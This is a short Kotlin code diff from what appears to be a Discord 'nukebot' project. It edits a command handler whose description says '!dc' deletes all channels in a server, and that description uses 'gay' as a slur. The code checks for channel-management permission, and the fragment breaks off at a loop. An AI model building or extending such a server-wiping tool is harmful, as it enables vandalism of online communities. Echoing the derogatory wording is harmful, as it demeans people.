@@ -9,8 +9,7 @@ import thenano.nukebot.bot.command.CommandManager
 @CommandListener.Info("!dc","Delete All gay channel in this server",false)
 class DeleteChannel : CommandListener() {
 
-    override fun onMessageReceived(event: MessageReceivedEvent) {
-        if (onInit(event)) return
+    override fun onEvent(event: MessageReceivedEvent) {
         if (message.contentRaw.contains("!dc")) {
             if (self.hasPermission(Permission.MANAGE_CHANNEL)) {
                 for (i in 0..2) {
